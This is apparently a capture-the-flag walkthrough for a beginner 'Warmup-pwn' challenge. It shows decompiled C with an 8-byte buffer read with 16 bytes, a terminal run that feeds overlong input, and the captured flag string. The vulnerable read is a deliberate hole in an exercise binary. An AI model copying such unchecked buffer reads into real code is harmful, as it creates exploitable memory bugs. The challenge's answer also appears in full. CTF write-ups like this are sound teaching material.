# [Pwn] Warmup-pwn 

## ✨ Walkthrough

Basic buffer overflow challenge.

```c
void win(void)
{
  system("cat flag.txt");
  return;
}

undefined8 main(void)
{
  ssize_t payload;
  undefined buffer [8];
  int payload_len;
  
  initialize();
  puts("To get your flag, try to call the win() function!!");
  puts("Enter the magic payload...");
  payload = read(0,buffer,0x10);
  payload_len = (int)payload;
  if (payload_len < 9) {
    puts("Sorry, try again.");
  }
  else {
    puts("You got it dude!!");
    win();
  }
  return 0;
}
```

```
┌──(kali㉿kali)-[/[Pwn] Warmup-pwn]
└─$ ./warmup
To get your flag, try to call the win() function!!
Enter the magic payload...
1111111111111111  
You got it dude!!
CURTIN_CTF{Cyb3rW4rri0rPr0t3ctTh3N3tw0rk} 
```

## 🏳️ Flag

`CURTIN_CTF{Cyb3rW4rri0rPr0t3ctTh3N3tw0rk}`